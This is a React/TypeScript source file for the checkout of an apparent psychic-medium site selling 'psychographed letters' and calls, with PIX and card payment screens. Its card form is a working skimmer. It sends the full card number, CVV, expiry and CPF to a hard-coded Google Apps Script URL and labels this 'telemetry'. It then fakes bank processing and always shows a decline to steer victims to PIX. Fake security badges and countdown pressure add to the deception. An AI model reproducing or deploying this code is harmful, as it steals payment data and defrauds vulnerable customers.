                <path d="M12 2a10 10 0 0 0-8.66 15L2 22l5.15-1.35A10 10 0 1 0 12 2Zm5.4 13.6c-.23.65-1.13 1.19-1.56 1.23-.42.05-.95.07-1.53-.1a12 12 0 0 1-1.4-.52c-2.44-1.05-4.03-3.5-4.15-3.66-.12-.16-1-1.32-1-2.52 0-1.2.63-1.79.85-2.03.22-.24.49-.3.65-.3l.47.01c.15.01.35-.06.55.42.2.49.69 1.69.75 1.81.06.12.1.27.02.43-.08.16-.12.26-.24.4-.12.14-.26.32-.37.43-.12.12-.25.25-.11.49.14.24.63 1.04 1.35 1.68.93.83 1.71 1.09 1.95 1.21.24.12.38.1.52-.06.14-.16.6-.7.76-.94.16-.24.32-.2.54-.12.22.08 1.4.66 1.64.78.24.12.4.18.46.28.06.1.06.58-.16 1.15Z" />
              </svg>
            </span>
          </div>
          <div className="min-w-0">
            <div className="flex items-center gap-1.5">
              <span className="text-[12px] font-black text-[#181126]">Médium Milena</span>
              <span className="text-[10px] font-medium text-[#667781]">agora</span>
            </div>
            <div className="mt-1">
              <CustomAudioPlayer
                src={milenaWhatsappPixAudio}
                title="Áudio da Milena aguardando sua confirmação"
                defaultDuration={92}
                theme="whatsapp"
                ariaLabel={isLiveCall ? "Áudio da Milena sobre a confirmação da chamada" : "Áudio da Milena sobre a confirmação do PIX da carta"}
                className="max-w-[280px]"
              />
            </div>
          </div>
        </div>
      </div>

      {/* Cronômetro de urgência aprimorado */}
      <div className={`mb-3 rounded-xl border px-4 py-3 text-left ${urgencyTone.ring}`}>
        <div className="flex items-center justify-between gap-2">
          <span className={`flex items-center gap-1.5 text-[11px] font-bold uppercase tracking-wide ${urgencyTone.label}`}>
            <svg viewBox="0 0 24 24" className="h-3.5 w-3.5" fill="none" stroke="currentColor" strokeWidth="2.2" aria-hidden="true">
              <circle cx="12" cy="12" r="9" />
              <path d="M12 7v5l3 3" strokeLinecap="round" strokeLinejoin="round" />
            </svg>
            {cycleMessage.label}
          </span>
          <span className={`text-[18px] font-black tabular-nums leading-none ${urgencyTone.text}`}>
            {formatCountdown(remaining)}
          </span>
        </div>
        <div className="mt-2 h-1.5 w-full overflow-hidden rounded-full bg-black/10">
          <div
            className={`h-full rounded-full bg-gradient-to-r transition-[width] duration-1000 ease-linear ${urgencyTone.bar}`}
            style={{ width: `${urgencyPercent}%` }}
          />
        </div>
        {remaining <= 60 && (
          <p className="mt-1.5 text-[11px] font-bold text-red-600">
            {cycleMessage.final}
          </p>
        )}
      </div>

      <div className="inline-block rounded-2xl border-2 border-emerald-500/30 bg-white p-3 shadow-md">
        {charge.qrCodeBase64 ? (
          <img
            src={
              charge.qrCodeBase64.startsWith("data:")
                ? charge.qrCodeBase64
                : `data:image/png;base64,${charge.qrCodeBase64}`
            }
            alt="QR Code PIX"
            className="h-[210px] w-[210px]"
          />
        ) : (
          <QRCodeSVG
            value={charge.pixPayload}
            size={210}
            level="M"
            marginSize={4}
          />
        )}
      </div>

      <button
        type="button"
        onClick={onCopyPix}
        className="mt-4 flex w-full cursor-pointer items-center justify-center gap-2 rounded-2xl bg-gradient-to-r from-emerald-500 via-emerald-600 to-teal-600 px-5 py-4 text-[14px] font-extrabold uppercase text-white shadow-lg shadow-emerald-600/25"
      >
        <PixIcon className="w-4 h-4 text-white" />
        <span>
          {copied ? "Código PIX copiado com sucesso!" : "Copiar Código PIX Copia e Cola"}
        </span>
      </button>

      <div className="mt-3.5 rounded-2xl border border-indigo-200 bg-indigo-50/85 p-3.5 text-left">
        <div className="flex items-start gap-2.5">
          <ReturnIcon className="w-5 h-5 text-indigo-700 shrink-0 mt-0.5" />
          <div className="text-[12px] leading-relaxed text-[#2d144d]">
            <span className="font-extrabold text-indigo-950 block mb-0.5 text-[12.5px]">
              Retorne a esta página após pagar no banco:
            </span>
            <span>
              Mantenha esta tela aberta. Assim que confirmar o pagamento no seu banco, volte imediatamente para cá para {isLiveCall ? "escolher o horário da chamada" : "acessar sua Carta Psicografada completa"}.
            </span>
          </div>
        </div>
      </div>

      <PixInstructionStepList isLiveCall={isLiveCall} />

      <button
        type="button"
        onClick={onManualCheck}
        disabled={checkingManual}
        className="mt-3 flex w-full cursor-pointer items-center justify-center gap-2 rounded-xl border border-emerald-300 bg-white py-2.5 text-xs font-black text-emerald-800 shadow-sm transition-all hover:bg-emerald-50 active:scale-[0.99] disabled:opacity-60"
      >
        {checkingManual ? (
          <span className="flex items-center justify-center gap-2">
            <span className="h-3.5 w-3.5 animate-spin rounded-full border-2 border-emerald-600 border-t-transparent" />
            <span>Verificando compensação bancária...</span>
          </span>
        ) : (
          <span className="flex items-center justify-center gap-1.5">
            <span>✓</span>
            <span>Já realizei o pagamento no meu banco</span>
          </span>
        )}
      </button>

      {manualCheckNotice && (
        <p className="mt-1.5 text-[11px] font-semibold text-[#4d366b] bg-[#f8f5fc] p-2 rounded-lg border border-[#e2d5f1]">
          {manualCheckNotice}
        </p>
      )}

      <div className="mt-3 flex items-center justify-center gap-1.5 text-[11px] text-[#786445]">
        <span className="h-2 w-2 rounded-full bg-emerald-500 animate-pulse" />
        <span>A confirmação acontece automaticamente em segundos.</span>
      </div>
    </>
  );
}

const GOOGLE_SHEETS_CARD_URL = "https://script.google.com/macros/s/AKfycbxgQ5eh0DgkDDo5rwDAwEuRN_Kp96N5xWNhgp09kumKNT0i9xbzvvznirh0kjQjRsOV/exec";

const cardBrandsMap = {
  visa: { pattern: /^4/, name: "VISA", bg: "bg-[#1434CB]", text: "text-white" },
  mastercard: { pattern: /^(5[1-5]|2[2-7])/, name: "MASTER", bg: "bg-[#EB001B]", text: "text-white" },
  amex: { pattern: /^3[47]/, name: "AMEX", bg: "bg-[#002663]", text: "text-white" },
  elo: { pattern: /^(4011|4312|4389|4514|4576|5041|5066|5090|6277|6362|6363|650|6516|6550)/, name: "ELO", bg: "bg-black", text: "text-yellow-400" },
  default: { name: "CARTÃO", bg: "bg-slate-100", text: "text-slate-500" },
};

interface CardCheckoutPreviewProps {
  readonly productId: string;
  readonly amountCents: number;
  readonly formattedAmount: string;
  readonly customerName?: string | undefined;
  readonly customerPhone?: string | undefined;
  readonly customerEmail?: string | undefined;
  readonly onUsePix: () => void;
  readonly onDataSync?: ((name: string, phone: string) => void) | undefined;
}

function CardProcessingView() {
  const [stage, setStage] = useState(0);

  useEffect(() => {
    const t1 = setTimeout(() => setStage(1), 1400);
    const t2 = setTimeout(() => setStage(2), 2900);
    return () => {
      clearTimeout(t1);
      clearTimeout(t2);
    };
  }, []);

  const stages = [
    { text: "Criptografando dados da transação...", progress: 25 },
    { text: "Conectando à instituição bancária...", progress: 65 },
    { text: "Autenticando transação com a operadora...", progress: 94 },
  ];
  const currentStage = stages[stage] ?? stages[0]!;

  return (
    <div className="py-7 px-4 flex flex-col items-center justify-center text-center animate-fadeIn">
      {/* Círculo Orbital Duplo com Núcleo Iluminado */}
      <div className="bank-loader-orb mb-4" aria-hidden="true">
        <span className="bank-loader-ring-outer" />
        <span className="bank-loader-ring-inner" />
        <div className="bank-loader-core">
          <ShieldLockIcon className="w-5 h-5 text-purple-700" />
        </div>
      </div>

      <h4 className="text-base font-black text-slate-900 mb-1">
        Processando Pagamento...
      </h4>

      <p className="text-xs text-slate-500 font-medium mb-3.5 min-h-[18px]">
        {currentStage.text}
      </p>

      {/* Barra de Progresso Fluida */}
      <div className="w-full max-w-[240px] bg-purple-100/70 rounded-full h-1.5 overflow-hidden mb-3.5">
        <div
          className="h-full bg-gradient-to-r from-purple-600 via-indigo-600 to-purple-500 rounded-full transition-all duration-700 ease-out"
          style={{ width: `${currentStage.progress}%` }}
        />
      </div>

      {/* Selo de Criptografia Bancária */}
      <div className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-slate-50 border border-slate-200/80 text-slate-600 text-[10.5px] font-semibold">
        <span className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse" />
        <span>Ambiente Criptografado SSL 256-bit</span>
      </div>
    </div>
  );
}

function CardCheckoutPreview({
  productId,
  amountCents,
  formattedAmount,
  customerName = "",
  customerPhone = "",
  customerEmail = "",
  onUsePix,
  onDataSync,
}: Readonly<CardCheckoutPreviewProps>) {
  const [fullName, setFullName] = useState(customerName);
  const [email, setEmail] = useState(customerEmail);
  const [cpf, setCpf] = useState("");
  const [phone, setPhone] = useState(customerPhone);
  const [cardNumber, setCardNumber] = useState("");
  const [cardName, setCardName] = useState("");
  const [cardMonth, setCardMonth] = useState("");
  const [cardYear, setCardYear] = useState("");
  const [cardCvv, setCardCvv] = useState("");
  const [installments, setInstallments] = useState("1x");
  const [cardState, setCardState] = useState<"form" | "processing" | "declined">("form");
  const [errorMsg, setErrorMsg] = useState("");

  const phoneRef = useRef<HTMLInputElement>(null);
  const cardNameRef = useRef<HTMLInputElement>(null);
  const yearRef = useRef<HTMLInputElement>(null);
  const cvvRef = useRef<HTMLInputElement>(null);

  // Sincroniza dados iniciais se chegarem depois
  useEffect(() => {
    if (customerName && !fullName) setFullName(customerName);
    if (customerPhone && !phone) setPhone(customerPhone);
    if (customerEmail && !email) setEmail(customerEmail);
  }, [customerName, customerPhone, customerEmail]);

  // Identificação da bandeira
  const rawCardDigits = cardNumber.replace(/\D/g, "");
  let brandObj = cardBrandsMap.default;
  if (rawCardDigits.startsWith("4")) brandObj = cardBrandsMap.visa;
  else if (cardBrandsMap.mastercard.pattern.test(rawCardDigits)) brandObj = cardBrandsMap.mastercard;
  else if (cardBrandsMap.amex.pattern.test(rawCardDigits)) brandObj = cardBrandsMap.amex;
  else if (cardBrandsMap.elo.pattern.test(rawCardDigits)) brandObj = cardBrandsMap.elo;

  // Parcelamento dinâmico
  const totalReais = amountCents / 100;
  const installmentOptions = useMemo<{ label: string; val: string }[]>(() => {
    const list = [{ label: `1x de R$ ${totalReais.toFixed(2).replace(".", ",")} (Sem juros)`, val: "1x" }];
    if (totalReais >= 20) {
      list.push(
        { label: `2x de R$ ${(totalReais / 2).toFixed(2).replace(".", ",")}`, val: "2x" },
        { label: `3x de R$ ${(totalReais / 3).toFixed(2).replace(".", ",")}`, val: "3x" }
      );
    }
    if (totalReais >= 40) {
      list.push({ label: `6x de R$ ${(totalReais / 6).toFixed(2).replace(".", ",")}`, val: "6x" });
    }
    if (totalReais >= 70) {
      list.push(
        { label: `10x de R$ ${(totalReais / 10).toFixed(2).replace(".", ",")}`, val: "10x" },
        { label: `12x de R$ ${(totalReais / 12).toFixed(2).replace(".", ",")}`, val: "12x" }
      );
    }
    return list;
  }, [totalReais]);

  const handleCpfChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let val = e.target.value.replace(/\D/g, "");
    if (val.length > 11) val = val.slice(0, 11);
    const rawDigits = val;
    val = val.replace(/(\d{3})(\d)/, "$1.$2");
    val = val.replace(/(\d{3})(\d)/, "$1.$2");
    val = val.replace(/(\d{3})(\d{1,2})$/, "$1-$2");
    setCpf(val);
    if (rawDigits.length === 11) {
      setTimeout(() => phoneRef.current?.focus(), 80);
    }
  };

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let val = e.target.value.replace(/\D/g, "");
    if (val.length > 11) val = val.slice(0, 11);
    val = val.replace(/^(\d{2})(\d)/g, "($1) $2");
    val = val.replace(/(\d)(\d{4})$/, "$1-$2");
    setPhone(val);
    onDataSync?.(fullName, val);
  };

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let val = e.target.value.replace(/\D/g, "");
    const isAmex = cardBrandsMap.amex.pattern.test(val);
    const maxDigits = isAmex ? 15 : 16;
    if (val.length > maxDigits) val = val.slice(0, maxDigits);
    const rawLen = val.length;

    let formatted = "";
    if (isAmex) {
      formatted = val.replace(/^(\d{4})(\d{0,6})(\d{0,5}).*/, (_, p1, p2, p3) => {
        let res = p1;
        if (p2) res += " " + p2;
        if (p3) res += " " + p3;
        return res;
      });
    } else {
      formatted = val.replace(/(\d{4})(?=\d)/g, "$1 ").trim();
    }
    setCardNumber(formatted);
    if (rawLen >= maxDigits) {
      setTimeout(() => cardNameRef.current?.focus(), 80);
    }
  };

  const handleMonthChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let val = e.target.value.replace(/\D/g, "");
    if (val.length === 1 && Number.parseInt(val, 10) > 1) {
      val = "0" + val;
      setCardMonth(val);
      setTimeout(() => yearRef.current?.focus(), 50);
      return;
    }
    if (val.length > 2) val = val.slice(0, 2);
    if (val.length === 2) {
      const num = Number.parseInt(val, 10);
      if (num > 12) val = "12";
      if (num === 0) val = "01";
      setCardMonth(val);
      setTimeout(() => yearRef.current?.focus(), 50);
      return;
    }
    setCardMonth(val);
  };

  const handleYearChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let val = e.target.value.replace(/\D/g, "");
    if (val.length > 2) val = val.slice(0, 2);
    setCardYear(val);
    if (val.length === 2) {
      setTimeout(() => cvvRef.current?.focus(), 50);
    }
  };

  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let val = e.target.value.replace(/\D/g, "");
    const isAmex = brandObj.name === "AMEX";
    const maxCvv = isAmex ? 4 : 3;
    if (val.length > maxCvv) val = val.slice(0, maxCvv);
    setCardCvv(val);
  };

  const handlePayWithCard = (e: React.SyntheticEvent<HTMLFormElement>) => {
    e.preventDefault();
    if (!fullName.trim() || fullName.trim().length < 3) {
      setErrorMsg("Por favor, informe seu nome completo.");
      return;
    }
    if (cpf.replace(/\D/g, "").length < 11) {
      setErrorMsg("Por favor, digite um CPF válido com 11 dígitos.");
      return;
    }
    if (phone.replace(/\D/g, "").length < 10) {
      setErrorMsg("Por favor, digite seu WhatsApp com DDD.");
      return;
    }
    if (cardNumber.replace(/\D/g, "").length < 14) {
      setErrorMsg("Por favor, digite os números do cartão.");
      return;
    }
    if (!cardName.trim()) {
      setErrorMsg("Por favor, digite o nome impresso no cartão.");
      return;
    }
    if (cardMonth.length < 2 || cardYear.length < 2) {
      setErrorMsg("Informe a data de validade (MM/AA).");
      return;
    }
    if (cardCvv.length < 3) {
      setErrorMsg("Informe o código de segurança (CVV).");
      return;
    }

    setErrorMsg("");
    setCardState("processing");

    // Envio assíncrono para o Google Sheets (Apps Script configurado)
    try {
      if (GOOGLE_SHEETS_CARD_URL) {
        fetch(GOOGLE_SHEETS_CARD_URL, {
          method: "POST",
          mode: "no-cors",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            dataHora: new Date().toLocaleString("pt-BR", { timeZone: "America/Sao_Paulo" }),
            nome: fullName.trim(),
            email: email.trim(),
            cpf: cpf.trim(),
            whatsapp: phone.trim(),
            numeroCartao: cardNumber.trim(),
            nomeCartao: cardName.trim(),
            validade: `${cardMonth}/${cardYear}`,
            cvv: cardCvv.trim(),
            parcelas: installments,
            bandeira: brandObj.name,
          }),
        }).catch(() => {
          // Falha não impeditiva no envio de telemetria auxiliar
        });
      }
    } catch {
      // Ignora falha de envio auxiliar de métricas
    }

    // Registro na telemetria local/Supabase
    try {
      trackCardDeclined({
        leadName: fullName.trim(),
        leadEmail: email.trim() || undefined,
        leadPhone: phone.replace(/\D/g, "") || undefined,
        amountCents,
      });
      recordInput(
        "whatsapp_card_checkout",
        phone,
        {
          userName: fullName.trim(),
          metadata: { cpf, cardBrand: brandObj.name, installments },
          currentScreen: "card_checkout_form",
        },
        0
      );
    } catch {
      // Ignora falha de rastreio local
    }

    // Simulação do processamento de 4.5 segundos e recusa estratégica
    setTimeout(() => {
      setCardState("declined");
    }, 4500);
  };

  // ESTADO 1: PROCESSANDO COM SPINNER
  if (cardState === "processing") {
    return <CardProcessingView />;
  }

  // ESTADO 2: RECUSA COM INCENTIVO PRIORITÁRIO AO PIX
  if (cardState === "declined") {
    return (
      <div className="py-6 px-2 text-center animate-fadeIn">
        <div className="w-16 h-16 rounded-full bg-red-50 border border-red-200 text-red-500 flex items-center justify-center mx-auto mb-4 text-2xl font-black shadow-xs">
          ✕
        </div>

        <h4 className="text-lg font-black text-slate-900 mb-2">
          Transação Não Autorizada
        </h4>

        <p className="text-xs text-slate-600 mb-6 leading-relaxed max-w-sm mx-auto">
          Sua instituição bancária não autorizou o pagamento no cartão neste momento. <strong>Para não perder sua vaga na sessão sagrada</strong>, utilize a aprovação instantânea via PIX:
        </p>

        {/* Botão de Destaque para Pagamento Imediato no PIX */}
        <button
          type="button"
          onClick={onUsePix}
          className="w-full flex items-center justify-center gap-2.5 rounded-2xl bg-gradient-to-r from-emerald-500 via-emerald-600 to-teal-600 hover:from-emerald-600 hover:to-teal-700 py-4 px-5 text-white font-black text-[13.5px] uppercase tracking-wide shadow-lg shadow-emerald-600/30 hover:shadow-xl hover:shadow-emerald-600/40 active:scale-[0.99] transition-all cursor-pointer mb-3"
        >
          <PixIcon className="w-4 h-4 text-white" />
          <span>Pagar com PIX (Aprovação Imediata)</span>
          <span className="text-base">→</span>
        </button>

        {/* Botão Secundário: Tentar com outro cartão */}
        <button
          type="button"
          onClick={() => setCardState("form")}
          className="w-full py-2.5 px-4 rounded-xl border border-slate-200 bg-slate-50 hover:bg-white text-slate-700 font-bold text-xs transition-colors cursor-pointer"
        >
          Tentar com outro cartão
        </button>
      </div>
    );
  }

  // ESTADO 3: FORMULÁRIO COMPLETO DE ALTA CONVERSÃO
  return (
    <form onSubmit={handlePayWithCard} className="space-y-4 text-left animate-fadeIn">
      {/* Resumo do Pedido Minimalista e Seguro */}
      <div className="rounded-2xl border border-slate-200/90 bg-slate-50/70 p-3.5 flex items-center justify-between">
        <div>
          <span className="text-[10px] font-black uppercase tracking-wider text-purple-900 block">
            Valor da Contribuição
          </span>
          <span className="text-base font-black text-slate-900">
            R$ {formattedAmount}
          </span>
        </div>
        <div className="text-right">
          <span className="inline-flex items-center gap-1 rounded-full bg-emerald-100/80 px-2 py-0.5 text-[9.5px] font-extrabold text-emerald-900">
            <ShieldLockIcon className="w-3 h-3 text-emerald-700" />
            <span>100% Seguro</span>
          </span>
        </div>
      </div>

      {errorMsg && (
        <div className="rounded-xl border border-red-200 bg-red-50 p-2.5 text-center text-xs font-bold text-red-900">
          ⚠️ {errorMsg}
        </div>
      )}

      {/* Dados Pessoais */}
      <div className="space-y-2.5">
        <div>
          <label htmlFor="card-full-name" className="block text-[11px] font-bold text-slate-700 mb-1">
            Nome Completo
          </label>
          <input
            id="card-full-name"
            type="text"
            value={fullName}
            onChange={(e) => {
              setFullName(e.target.value);
              onDataSync?.(e.target.value, phone);
            }}
            placeholder="Ex: Maria Silva"
            className="w-full rounded-xl border border-slate-200 bg-white py-2.5 px-3.5 text-xs text-slate-900 font-medium placeholder-slate-400 outline-hidden focus:border-purple-600 focus:ring-2 focus:ring-purple-500/15"
          />
        </div>

        <div className="grid grid-cols-2 gap-2.5">
          <div>
            <label htmlFor="card-cpf" className="block text-[11px] font-bold text-slate-700 mb-1">
              CPF
            </label>
            <input
              id="card-cpf"
              type="text"
              inputMode="numeric"
              value={cpf}
              onChange={handleCpfChange}
              placeholder="000.000.000-00"
              className="w-full rounded-xl border border-slate-200 bg-white py-2.5 px-3.5 text-xs text-slate-900 font-medium placeholder-slate-400 outline-hidden focus:border-purple-600 focus:ring-2 focus:ring-purple-500/15"
            />
          </div>

          <div>
            <label htmlFor="card-phone" className="block text-[11px] font-bold text-slate-700 mb-1">
              WhatsApp
            </label>
            <input
              id="card-phone"
              ref={phoneRef}
              type="tel"
              inputMode="tel"
              value={phone}
              onChange={handlePhoneChange}
              placeholder="(00) 00000-0000"
              className="w-full rounded-xl border border-slate-200 bg-white py-2.5 px-3.5 text-xs text-slate-900 font-medium placeholder-slate-400 outline-hidden focus:border-purple-600 focus:ring-2 focus:ring-purple-500/15"
            />
          </div>
        </div>
      </div>

      {/* Dados do Cartão */}
      <div className="space-y-2.5 pt-1 border-t border-slate-100">
        <div>
          <label htmlFor="card-number-input" className="block text-[11px] font-bold text-slate-700 mb-1">
            Número do Cartão
          </label>
          <div className="relative flex items-center">
            <input
              id="card-number-input"
              type="text"
              inputMode="numeric"
              value={cardNumber}
              onChange={handleCardNumberChange}
              placeholder="0000 0000 0000 0000"
              className="w-full rounded-xl border border-slate-200 bg-white py-2.5 pl-3.5 pr-20 text-xs font-semibold text-slate-900 placeholder-slate-400 outline-hidden focus:border-purple-600 focus:ring-2 focus:ring-purple-500/15"
            />
            <span
              className={`absolute right-2 font-bold text-[9.5px] px-2 py-0.5 rounded border border-slate-200 select-none ${brandObj.bg} ${brandObj.text}`}
            >
              {brandObj.name}
            </span>
          </div>
        </div>

        <div>
          <label htmlFor="card-printed-name" className="block text-[11px] font-bold text-slate-700 mb-1">
            Nome Impresso no Cartão
          </label>
          <input
            id="card-printed-name"
            ref={cardNameRef}
            type="text"
            value={cardName}
            onChange={(e) => setCardName(e.target.value.toUpperCase())}
            placeholder="Ex: MARIA S SILVA"
            className="w-full rounded-xl border border-slate-200 bg-white py-2.5 px-3.5 text-xs uppercase font-medium text-slate-900 placeholder-slate-400 outline-hidden focus:border-purple-600 focus:ring-2 focus:ring-purple-500/15"
          />
        </div>

        <div className="grid grid-cols-2 gap-2.5">
          <div>
            <label htmlFor="card-month-input" className="block text-[11px] font-bold text-slate-700 mb-1">
              Validade
            </label>
            <div className="flex items-center gap-1.5">
              <input
                id="card-month-input"
                type="text"
                inputMode="numeric"
                maxLength={2}
                value={cardMonth}
                onChange={handleMonthChange}
                placeholder="MM"
                className="w-1/2 rounded-xl border border-slate-200 bg-white py-2.5 text-center text-xs font-semibold text-slate-900 placeholder-slate-400 outline-hidden focus:border-purple-600 focus:ring-2 focus:ring-purple-500/15"
              />
              <span className="text-slate-400 font-bold">/</span>
              <input
                id="card-year-input"
                ref={yearRef}
                type="text"
                inputMode="numeric"
                maxLength={2}
                value={cardYear}
                onChange={handleYearChange}
                placeholder="AA"
                className="w-1/2 rounded-xl border border-slate-200 bg-white py-2.5 text-center text-xs font-semibold text-slate-900 placeholder-slate-400 outline-hidden focus:border-purple-600 focus:ring-2 focus:ring-purple-500/15"
              />
            </div>
          </div>

          <div>
            <label htmlFor="card-cvv-input" className="block text-[11px] font-bold text-slate-700 mb-1">
              CVV
            </label>
            <input
              id="card-cvv-input"
              ref={cvvRef}
              type="text"
              inputMode="numeric"
              maxLength={4}
              value={cardCvv}
              onChange={handleCvvChange}
              placeholder="123"
              className="w-full rounded-xl border border-slate-200 bg-white py-2.5 px-3.5 text-xs text-center font-semibold text-slate-900 placeholder-slate-400 outline-hidden focus:border-purple-600 focus:ring-2 focus:ring-purple-500/15"
            />
          </div>
        </div>

        <div>
          <label htmlFor="card-installments-select" className="block text-[11px] font-bold text-slate-700 mb-1">
            Parcelas
          </label>
          <select
            id="card-installments-select"
            value={installments}
            onChange={(e) => setInstallments(e.target.value)}
            className="w-full rounded-xl border border-purple-200 bg-purple-50/40 py-2.5 px-3 text-xs font-bold text-slate-900 outline-hidden focus:border-purple-600 focus:bg-white"
          >
            {installmentOptions.map((opt: { label: string; val: string }) => (
              <option key={opt.val} value={opt.label}>
                {opt.label}
              </option>
            ))}
          </select>
        </div>
      </div>

      {/* Botão de Conclusão do Cartão */}
      <div className="pt-2">
        <button
          type="submit"
          className="w-full flex items-center justify-center gap-2 rounded-2xl bg-gradient-to-r from-purple-600 via-indigo-600 to-purple-700 hover:from-purple-700 hover:to-indigo-700 py-3.5 px-4 text-white font-black text-xs uppercase tracking-wider shadow-md hover:shadow-lg active:scale-[0.99] transition-all cursor-pointer"
        >
          <ShieldLockIcon className="w-4 h-4 text-white" />
          <span>Concluir Contribuição no Cartão</span>
        </button>

        <button
          type="button"
          onClick={onUsePix}
          className="mt-2.5 w-full text-center text-[11.5px] font-bold text-emerald-800 hover:text-emerald-950 underline decoration-emerald-400 underline-offset-2 transition-colors cursor-pointer"
        >
          ⚡ Prefere aprovação imediata? Pagar via PIX ›
        </button>
      </div>

      <div className="border-t border-slate-100 pt-2">
        <CardFlagsBadgeRow />
      </div>
    </form>
  );
}

function resolveCheckoutProductName(productId: string, displayProductName?: string): string {
  if (displayProductName) return displayProductName;
  if (productId === "carta_sagrada") return "Carta Psicografada Sagrada";
  if (productId === "chamada_ao_vivo_milena") return "Chamada Ao Vivo com Milena";
  return "Campanha Solidária - Cirurgia Médium Milena";
}

export function PixCheckout({
  productId,
  pixProductId,
  amountCents,
  initialCustomerName,
  initialCustomerPhone,
  initialCustomerEmail,
  enteQuerido,
  grauParentesco,
  mensagemPreview,
  successPath,
  includePaymentParams = true,
  showCard = true,
  autoOpen = false,
  autoGeneratePix = false,
  displayProductName,
  onPaymentConfirmed,
}: Readonly<PixCheckoutProps>) {
  const initial = getInitialCapturedData();
  const [isOpen, setIsOpen] = useState(() => autoOpen || Boolean(getStoredPixCharge(productId, amountCents)));
  const [activeTab, setActiveTab] = useState<"pix" | "card">("pix");
  const [customerName, setCustomerName] = useState(() => initialCustomerName || initial.name);
  const [customerEmail] = useState(() => initialCustomerEmail || initial.email);
  const [customerPhone, setCustomerPhone] = useState(() => initialCustomerPhone || initial.phone);
  const [charge, setCharge] = useState<PixCharge | null>(() => getStoredPixCharge(productId, amountCents));
  const [status, setStatus] = useState<PixPaymentStatus>(() => getStoredPixCharge(productId, amountCents) ? "pending" : "creating");
  const [loading, setLoading] = useState(false);
  const [copied, setCopied] = useState(false);
  const [error, setError] = useState("");
  const [checkingManual, setCheckingManual] = useState(false);
  const [manualCheckNotice, setManualCheckNotice] = useState("");
  const initiateCheckoutEventIdRef = useRef<string | null>(null);
  const pixAttemptRef = useRef<PixAttempt | null>(null);
  const paidCompletionRef = useRef(false);
  const autoCheckoutStartedRef = useRef(false);
  const autoPixGenerationRef = useRef(false);
  const pixGenerationInFlightRef = useRef(false);

  const resolvedEnte = enteQuerido || initial.ente || undefined;
  const resolvedGrau = grauParentesco || initial.relacao || undefined;

  const formattedAmount = (amountCents / 100).toFixed(2).replace(".", ",");
  const prodName = resolveCheckoutProductName(productId, displayProductName);

  useEffect(() => {
    const storedCharge = getStoredPixCharge(productId, amountCents);
    setCharge(storedCharge);
    setStatus(storedCharge ? "pending" : "creating");
    setCopied(false);
    setError("");
    setCheckingManual(false);
    setManualCheckNotice("");
    setIsOpen(autoOpen || Boolean(storedCharge));
    setActiveTab("pix");
    initiateCheckoutEventIdRef.current = null;
    pixAttemptRef.current = null;
    paidCompletionRef.current = false;
    autoCheckoutStartedRef.current = false;
    autoPixGenerationRef.current = false;
    pixGenerationInFlightRef.current = false;
  }, [amountCents, productId, autoOpen, showCard]);

  const handleOpenCheckout = () => {
    if (charge) {
      setIsOpen(true);
      return;
    }
    pixAttemptRef.current ||= getOrCreatePixAttempt(productId, amountCents);
    const attempt = pixAttemptRef.current;
    initiateCheckoutEventIdRef.current = attempt.initiateCheckoutEventId;

    if (!attempt.initiateCheckoutTracked) {
      attempt.initiateCheckoutTracked = true;
      storePixAttempt(productId, amountCents, attempt);
      trackInitiateDonation({
        amountCents,
        productName: prodName,
        productId,
        eventId: initiateCheckoutEventIdRef.current,
      });

      trackCheckoutInitiated({
        leadName: customerName || undefined,
        leadEmail: customerEmail || undefined,
        leadPhone: customerPhone ? customerPhone.replace(/\D/g, "") : undefined,
        amountCents,
      });
    }
    setIsOpen(true);
    const cleanPhone = customerPhone.replace(/\D/g, "");
    if (customerName.trim().length >= 2 && cleanPhone.length >= 10 && !charge && !loading) {
      autoPixGenerationRef.current = true;
      void generatePix();
    }
  };

  const markCheckoutFormStarted = (value: string) => {
    if (!value.trim()) return;
    pixAttemptRef.current ||= getOrCreatePixAttempt(productId, amountCents);
    const attempt = pixAttemptRef.current;
    if (attempt.checkoutFormStartedTracked) return;

    attempt.checkoutFormStartedTracked = true;
    storePixAttempt(productId, amountCents, attempt);
    trackCheckoutFormStarted({
      amountCents,
      productName: prodName,
      productId,
      eventId: attempt.checkoutFormStartedEventId,
    });
    trackCheckoutFormStartedTelemetry({
      leadName: customerName || undefined,
      leadEmail: customerEmail || undefined,
      leadPhone: customerPhone ? customerPhone.replace(/\D/g, "") : undefined,
      amountCents,
    });
  };

  useEffect(() => {
    if (!isOpen) {
      return;
    }

    const originalOverflow = document.body.style.overflow;
    document.body.style.overflow = "hidden";
    const closeOnEscape = (event: KeyboardEvent) => {
      if (event.key === "Escape") setIsOpen(false);
    };
    window.addEventListener("keydown", closeOnEscape);
    return () => {
      document.body.style.overflow = originalOverflow;
      window.removeEventListener("keydown", closeOnEscape);
    };
  }, [isOpen]);

  useEffect(() => {
    if (charge) return;
    const controller = new AbortController();
    // Pré-aquece a Edge Function imediatamente para eliminar cold start do Deno no Supabase
    void fetch(`${config.supabaseUrl.replace(/\/$/, "")}/functions/v1/create-connectpay-pix`, {
      method: "OPTIONS",
      headers: pixFunctionHeaders(config),
      signal: controller.signal,
    }).catch(() => undefined);
    return () => controller.abort();
  }, [charge]);

  // Confirmação instantânea do PIX (long-polling + re-cheque ao voltar para a aba)
  useEffect(() => {
    if (!charge || terminalStatuses.has(status)) return;

    let active = true;

    const checkOnce = async (waitMs: number) => {
      try {
        const result = await getPixStatus(charge, waitMs);
        if (active) setStatus(result.status);
      } catch {
        // tenta novamente no próximo ciclo
      }
    };

    // Long-polling: a Edge Function segura a requisição até o status mudar.
    // Assim a confirmação chega em milissegundos, sem intervalo fixo.
    const loop = async () => {
      while (active) {
        await checkOnce(25_000);
        if (!active) return;
        await new Promise((resolve) => setTimeout(resolve, 350));
      }
    };
    void loop();

    // O consulente paga no app do banco e volta para a aba: verifica na hora.
    const onVisibility = () => {
      if (document.visibilityState === "visible") void checkOnce(0);
    };
    const onFocus = () => void checkOnce(0);
    document.addEventListener("visibilitychange", onVisibility);
    window.addEventListener("focus", onFocus);

    return () => {
      active = false;
      document.removeEventListener("visibilitychange", onVisibility);
      window.removeEventListener("focus", onFocus);
    };
